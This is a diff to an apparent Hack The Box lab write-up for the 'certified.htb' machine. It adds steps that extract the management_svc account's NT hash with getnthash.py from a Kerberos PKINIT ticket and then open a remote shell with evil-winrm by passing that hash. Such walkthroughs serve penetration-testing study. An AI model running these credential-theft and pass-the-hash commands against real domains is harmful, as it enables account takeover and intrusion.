@@ -50,7 +50,19 @@
 	```python3 gettgtpkinit.py -cert-pfx PFX_FILE -pfx-pass PFX_PASS certified.htb/management_svc -dc-ip 10.129.130.180 ccache```
 ![image](https://github.com/user-attachments/assets/0931b573-328f-4fd0-a0c3-2e4d937da20c)
 
-8. 
+8. Export ccache to KRB5CCNAME env var and use AS-REP encryption key from getting TGT to get NT hash of management_svc account using PKINIT tools getnthash.py
+
+	```python3 getnthash.py -key AS_REP_KEY -dc-ip 10.129.130.180 certified.htb/management_svc```
+
+![image](https://github.com/user-attachments/assets/98efc969-2c11-4b5c-8890-777a40922f7d)
+
+9. Can evil-winrm into machine using management_svc hash
+
+	```evil-winrm -i 10.129.130.180 -u management_svc -H HASH```
+
+![image](https://github.com/user-attachments/assets/55e2e59e-2f73-4870-a387-3dfd2e37a651)
+
+10. 
 
 
  
